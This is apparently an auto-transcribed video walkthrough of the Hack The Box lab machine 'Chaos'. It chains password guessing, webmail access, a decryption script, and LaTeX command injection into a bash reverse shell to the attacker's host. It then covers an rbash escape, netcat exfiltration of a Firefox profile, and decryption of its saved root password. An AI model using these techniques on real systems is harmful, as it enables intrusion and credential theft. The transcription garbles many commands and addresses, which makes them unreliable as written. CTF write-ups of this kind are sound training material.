 what's going on YouTube the zipsak and we doing chaos from hacked the box which was a box that was centered around credential reuse and some white exploitation it starts off with finding a wordpress directory that has a protected purse meaning you need to put a password in to view the post you look at the username that person which was human and you try the password as human and you get to read the post it has credentials to log in to email you log in to the email and view the messages there is a Python crypto challenge you write a decryptor for it and then you get a new web page that has a web form that lets you generate a PDF viola tex or latex i don't know how to pronounce it which is essentially a language to generate document files that's used in white papers academia really cool language but you get coded execution through it and land on the box then there is a pretty mess through the credentials you used to get into I believe the email and from that you get into a users directory and then pull his Firefox profile and decrypt a password out of that and prove ask up to root with it so with that being said let's just jump in like every other box we're starting over there and map with - SC for default scripts as via enumerate versions Oh a output all formats put in the end map direct and call it chaos and then the IP address which is 10 10 10 120 this can take some time to run so I've already ran it we'll get the results we have a ton of ports open the first thing I notice is HTTP on port 80 that's running Apache version 2 4 3 4 it's saying it's at Ubuntu server so if we went to Launchpad and search which versions of Ubuntu use this we get the exact flavor like zani olds st whatever then we have pop3 on port 110 and that's running dovecot which is a mail protocol it is exposing the hostname of the box which is chaos we have IMAP on port 143 also running dovecot and exposes the same exact terrorists name then 993 and 995 or just the SSL implementations of IMAP and pop3 and then on point 10,000 we have mini serv version one point eight nine zero which webmin which I know is a web management application so the very first thing I'm going to do is start a go Buster on the website so that is go Buster - you for your el HTTP 10 10 10 120 - w-4 word list user share word waster Buster then directory list - 3 medium and then - oh for out file will call this route go bust dot log while that starts let's go in the host file and we'll add the entry 10 10 10 1:24 chaos because that is what was leaked via IMAP save that and let's go over to Firefox go to 10 10 10 1 20 and we see direct IP access is not allowed if we do HTTP colon slash slash Kaos we get that same exact error message we do see slash WP was found and I'm gonna do a little bit of guesswork and assume the top-level domain which is TLD is htb because that's where it's at for most boxes so save that host file let's go back and do HTTP colon slash slash Koh TB and we get a page it looks like so just scrolling around we see a email address info @ KO HTTP so I'm just going to copy that and we'll do ctrl shift end to create a channel node type email and paste this in and this application is called cherry tree so let's see what else we have looking at the social media links I'm just hiding these and working the bottom left and I see a Twitter account so hey underscore a why that does not exist but we can go to Cherry Tree create social media and put that in which could be a potential user account for this box so let's go back to the web page looking over other links don't really see anything we can do test test test click send and it just brings us back to the webpage so I'm going to send this over to book by cleaning foxy proxy make sure my burp is set to intercept let's just ignore all that and then send this email again to see what's going through so test test test click send and we didn't get anything so that's probably just some JavaScript that's not doing anything so I'm gonna turn Boop off we'll click on other links about dot HTML so probably not some dynamically created site looking at that read more it's still just an anchor link hall-of-fame chap Goblin but all these links look like they are dead so I'm gonna do the lazy thing and we're just going to go over to target we don't have chaos I each to be here let's turn in a setback on and intercept off here refresh this page this should go into burps target and then we'll just biter this host yes sure and then just seeing what pages burp can find so we have about blog contact CSS the Hall of Fame but that doesn't look like there's anything too interesting so going back to the go Buster we do have slash WP which is a blog and if I click on blog HTML it just says they are working on the blog so let's go to slash WP we get not found which is odd so I'm going to go back to the IP and do slash WP and we get the result that says WordPress so let's go into WordPress and we have the actual page so since this is a WordPress thing I'm gonna run WP scan against it so let's do WP scan - H because I always forget how to write out files so we'll do W piece can - - URL I that should be fine I don't think we need this HTTP and then let's see is there a way to do out files debug output I don't see it I'm just going to do the lazy thing type it to T and do W piece can help so we see the results and it writes it to a file and database is not updated for the sake of time I'm not going to worry about updating the database normally probably want to click yes but let's just see if I need to looks like it's ran going up we only have one user which the user is human and then let's go through the vulnerabilities so authenticated file delete well we don't have a user object we don't have a user or not user object but a login yet so we can ignore authenticated things PHP object injection via metadata that sounds like you have to login to do that and let's see file uploads again all these look like you need user logins so we could try doing a slash WP was it WP dash admin is that the admin yeah page there it is enjoy human human walking in WP scan does have a login feature so if we do WP scan - H probably I think it has a brute-force let's see this is a lot of output I know I've done in one box so we could have numerate more plugins with - - e with all these different things let's see if I just put user user agent user name only their brute force with the supply name so we can do - - user name and then we probably want to specify like a password file so looking at this here we go to a word list password brute force so - - word list and then specify the file so we can do - - user human - - word list and then users share SEC lists passwords we'll just do BTW for passwords text and it's - - user name okay this is going oh I have - H my commands still there we go don't update and it should be going so let's go back to the page and scroll down and it wants a password so I'm just gonna put the username human in the password field and scroll down and then we have creds for webmail username a huge which is kind of the username we've got from the social media and then password jiu-jitsu so let's copy the username put it in chaos again do a new child credentials I use and then jiu-jitsu for the password so let's try logging into the mail that we know about we could go back to go Buster's see if there was any like slash webmail or slash mail don't see that we could also go back into burp if we go to target send this to repeater we could try things like the host is equal to mail Koh TB or web mail cast RHD be just various places where we could potentially log into mail and this actually got something I don't think I expected that let's try this let's do V Etsy host and we'll create one for web mail dot Koh DB and then let's go to it so let's do web mail chaos HTTP and we get a round cube instance so we can do our you dude JIT su and login if we look around there is a draft email and we're loading it and it looks like hi say hey check the en message start text you are the password also attached is the script he used to encrypt so we have another user and perhaps if we go back to Cherry Tree look at social media say hey was the user we got it wasn't I use so oh as my spoken there but we have two files here so let's save the anim message text save file and then save en dot pi so save this as well we can copy them from a Downloads directory so move downloads anim message on text here and then move downloads what was the other file en dot pi but the way I actually did this one getting this box was I went into my nmap scan and saw that we had IMAP open so I tried to log into I'm at so if we do netcat 10-10-10 121 43 and then tried to do login a use jiu jitsu we get bad the first parameters IMAP is a command tag if you read the RFC for IMAP it'll make a little more sense so it's going to this RFC looking at the login command you can see a command or a client a zero zero one login username password server a zero zero one okay walk-in completed and they can search the whole document for this a zero zero thing and find out what it actually means let's actually just go to the very top and find the first instance and we see it's part of the client protocol sender and server protocol receiver and the client command begins with an operation each command is prefixed with an identifier typically a short alphanumeric string example a 0 0 1 / 2 and that's called a tag so let's go back to a terminal try to log in and we'll do please subscribe 0 0 a 0 0 1 well again I use jujitsu and it says bad plaintext authentication is not allowed without SSL TLS but you client did it anyways so let's just go back to this end map and choose the SSL version of IMAP which is 9 9 3 so we can do NCAT space - - SSL and this is one of the advantages to ncat / NC is you have the ssl options so do with - SSL and we'll copy this exact command and login and we see it was a login success if we copy the command and do it again with a bad password we see eventually it probably will say login failure there we go authentication failed so since we have IMAP we could just do app install like evolution which is a mail client on Linux and then run this mail client to log into the server now that is installed just launched it with evolution and then it should prompt us for some information so let's click Next no backup file identifier name let's do a yoosh then use at Koh tbh for the email address and then for the server we can do ksh DB username a yoosh click Next server for smtp the sending thing let's just put something there so we can proceed click Next apply and it's going to ask us for accepting the certificate so accept that and then put the password of jiu-jitsu and we can log in and get the draft message this way so if we maximize this we could download the same scripts that we could have before so let's just go and look at what they are so if we do a cat on an M message text we get a bunch of gibberish if we look at en PI this is a encryption program so we just have to create a decryption loop they did say in the email that you are the password so if we go back here you are the password he's saying it to say hey so I'm guessing say hey is going to be the key so let's create a function for decrypt and do key file name and I'm going to simple simplify this code a lot and not worry about chunking that is reading in the file in certain sizes because the file is relatively small so we should be able just to do it in one giant read command and I find it a little bit easier to do that way so let's read the file and we'll read it into a variable call F contents so that would be open F name read and I'm just gonna rename this variable away from file name to F name and I just don't like using file name because sometimes you get that conflicting with other variables so we'll do F sighs because looking at how it encrypts it will do the file size and then it's going into an out file and writing the file size then writing the IV so we have to probably read the file size and read the IV and the file size is let's see file size get foul name Z fill 16 bytes so an F size we can just do F contents and then : 16 so that will read the first 16 characters or bytes of F contents then we can do IV is equal to F contents and then 16 to 32 oops no sterling : this reads the next 16 and we can put encrypted is equal to F contents 32 : and that reads everything after it so we want to comment we can put file read 16 characters 16 characters for IV I'm going to put 16 characters for size and then unknown well we'll just put rest for blob okay so now we have to actually do the decryption and I'm going to go up to where we create the krypter object press YY to yank that line go down push P to put the line and we'll just rename encrypter the Decrypter and then all we have to do is pass Decrypter print decryptor decrypt and cryptid so that should do it on the very bottom we just have to call decrypt and then it was say hey and then the file name which is en IM underscore msg txt I think do LS yep so that should be good we're gonna get a few error messages because we don't have the libraries like global named a es is not defined so we have to figure out all the libraries and we just Google like I think Python AES library we should be able to find it relatively easy let's see from crypto dot cipher import AES do it again AES key must be either 16 24 or 32 bytes long where is my key so I'm putting the key as say hey oh we have to call that gate key function so do get key say hey and redo this global name sha-256 is not defined so we'll do from crypto - I think it's uppercase import sha-256 do I have it uppercase here yep and now we have the decrypted contents this is just base 64 and there is a bunch of spaces so I'm just going to clean that up and verify it as base 64 so let's do D underscore be 64 is equal to that I'm going to do dot strip and then we can do another import so we can do from base 64 import be 64 decode and now here we can just do print be 64 decode D underscore be 64 and we get the message so I say hey please check a new service which will create a PDF PS you told me encrypt import a message so he did so we can go to chaos h TB / jus and find nothing here so if we copy this go over to Firefox paste that link we get some PDF maker so let's do hello create PDF to see what happens nothing I'm clicking this create PDF button and not getting anything so I'm going to send it over to burp suite and then let's turn intercept on click create PDF send this into repeater click go and we get this is PDF text and text is part of latex I believe that's how you pronounce it which is a like document formatting language so we can see that right here so if we Google like let's see let's turn burp off latex RCE code injection and then going we have a thing from payload all the things with a few ways so we can try this / input Etsy passwd so go to burp but the content is equal to this and we'll see if it actually gives us the file we get blacklisted command used so we can't use this so let's see read/write command execution so we have slash immediate write 18 then curly braces and 2 output so we can try this and see if this one works so let's paste this in click go and we have a blacklisted command so let's see what is blacklisted if we went all the way up we use input and both of these commands so I'm just gonna get rid of the input and see what happens we click go it's waiting we need get immediate blacklisted command back so it looks like that works we just don't know if we actually executed code so I'm going to change this output into ping 1010 14 3 which is my IP and I need - c1 to do just a count of one ping and then we can do TCP dump - I times 0 ICMP click go and we get a ping from chaos so we know we have code execution let's do netcat LVN p 9001 and try sending a reverse shell so let's do bash - see then it would be bash - i that dev tcp 1010 14 3 9000 1 0 and 1 I think that's the show if you don't know you can just Google like pen test monkey reverse shell cheat sheet and it will be there so let's see if I did it correct do this see 10 10 14 3 9001 I did close that single quote click go and it doesn't look like you did this correctly or it just doesn't work so let's go to the reverse cheat sheet and make sure I typed everything correct so Bash - I then that dev TCP 0 2 and 1 I type that correct let's see maybe I don't need this bashed SC so let's try getting rid of this click go let's make sure my IP address is 1010 14 3 it should be since we paint myself so let's go back in the book and I think I know where it is - C let's do that we got a lot of funky characters in here and and and your L code or HTTP normally means separate by argument so let's ural encode this whole thing highlight it press ctrl you and we can see there's an x' went away click go and we have a shell so the first thing I always do with the show is a Python - C input PT y PT why not spawn Bend bash and then we will background it with ctrl z st - y raw - echo and then hit F G enter and this way we have tab auto-completion and things like that so we're on the box so the first thing I'm going to do is go over to that wordpress instance so let's find wordpress i don't know what this source directory is that's just icon font and we're going to try to get the password so let's do HTML WP WordPress and then cat wp-config.php and we can just search this for password and get it so let's see DB user is roundcube so we can go over to credentials MySQL we'll do email and this is gonna be round cube and the password is enter on cage so well over here we can see if I use uses his same email password for it his linux password week at Etsy past WD we can see he does have an account so if we do su - they use paste the password I don't think I paste no I did paste the password we do get a successful William pumped as we change from dub-dub-dub data to a use and then if we do LS we find out we're in a our bash instance so if we do echo path we can see all the commands we can execute or within this directory because that's how our bash works so if we do it LS o we can't do LS we do that directory and hit tab twice we can see which commands we have we have dir paying ant are we could have probably also typed help and saw what commands we had but we had three commands in this directory dir ping and tar so let's go to Firefox do GTFO bins and looking at this we have dir not they're paying not there tar it tells us that we can get a shell so we'll just click that and run this command paste and then we do LS command not found which is not the restricted shell command so let's export path is equal to slash bin which i think is where LS is and then that works we can also go back into this restricted shell and just export path equal slash bin and I think that works it does so you can do LS there and the reason why that works is all the way back here when we did the su I used this - and the way that our Bash is configured it's allowing this to be a read/write variable because the - if we look at man su I'm just gonna quit here and do it all my County box we can see what - means come on where's - I think it's also - P preserve environment maybe here create a pseudo terminal for the session you can read the man page I hate doing it live because it would just eat a lot of time but anyways when you're doing that it's creating the path variable as a readwrite object if we don't do that and just su a use without that and Tapia's password paste it in if we can type it this time because maybe we can type better than we can paste that is true we can do export path is equal to slash bin and we get its a read only variable and then if we go back to tar and we run that same command we can escape and now since we ran through tar it's no longer read-only so that is that we go into our home directory we do LS - la we have a dot Mozilla directory which is odd and we also have this male directory so let's look at what male is and then this is the I guess I'm app directory and then there is Mozilla so let's go and take a look at what's in Mozilla I'm just going to copy this to my desktop so let's do tar - let's do the xvf and call this dev sh m dot mozilla dot dot I forget what Z is I think it's guns if web be zip I hate tar command flags but it won't matter as long as we use the same flag to decompress it so we'll do dot Mozilla bike in tight and let's see turn - z c VF to create I was trying to extract it so we'll call this Mozilla rgz and then the file name Mozilla to compress it now we can just run netcat LVN P 9001 to Mozilla later dot GZ and we can do netcat do we have net cat - H we do so we do NC ten ten fourteen three point nine thousand one and direct the contents of Mozilla tar.gz choose that session no such file we put it in dev s hm so let's fix that dev s hm Mozilla tar.gz we can see connection and this isn't going to automatically close when it's done the file maybe we shine like done katha this file then piped it to NC but if we control C out of it we can just md5 sum on both ends and make sure they are the same file of course we don't have md5 sum here we have to which or just echo path and then export the path to be this so export path is equal to that and now we probably have md5sum there we go 3e d FB 3e d starts FB ends so we got the same file and we can do a file against this and it is a gzip compressed archive so I guess the flag correctly so let's just do tur z XV f for 0 rgz and we can go into this profile if we go into Firefox we do have the profile bz 0 7 j st 1 and i'm just going to try to decrypt this profile to find the password so let's do the program firefox Decrypter and this program will give us all the stored passwords in firefox this was also done on the Crimestoppers machine so that's why I'm kind of just jumping a bunch of the enumeration because we've done this on a machine before so we can run Python Firefox decrypt on this directory so let's copy this paste and then Firefox PZ something default and we have to get a password so I'm going to put the Jujitsu password because that's what we used before and we have the website KS h DB port 10000 username is root password is this so we can log in to web min so 10 10 10 120 port 10,000 it wants SSL so and once HTTPS well again and while that loads we could also just go back and probably do a su so if we go back to a shell we can do su - root paste the password and we are in as the Kaos user root at Kaos we want to do this through webmin we could paste it in here and I think this application has a way to execute commands let us validate that so we're in webmin and it is going really slow but if we go to others we got a command shell and right here since it's a web server management web application and uses I guess the default Linux accounts so it uses localhost authentication for this and since we had the root password anyways it lets us just access this ship web shell as root so they have it and if you're looking for more I would recommend going to github and checking out the lasagna or lizanne I don't know how to pronounce is actually this repository let's go back and try running this against the machine this is a awesome project that just automatically extracts all the credentials it can find on a box and if you wanted to integrate it in some type of C - it's already integrated in puppy which I'd recommend taking a look at I'll probably do separate videos on certain C twos now that we have some type of walling solution set up so we'll run various C twos like Metasploit puppy um I forget a few other ones but run them and see if we can find ways to make sure we have detection on them but if you do puppy you'll be able to get a reverse connection on the chaos box and then there's a module to run lasagna so I highly recommend doing that unfortunately I don't have the time to show you all take care and I will see you next week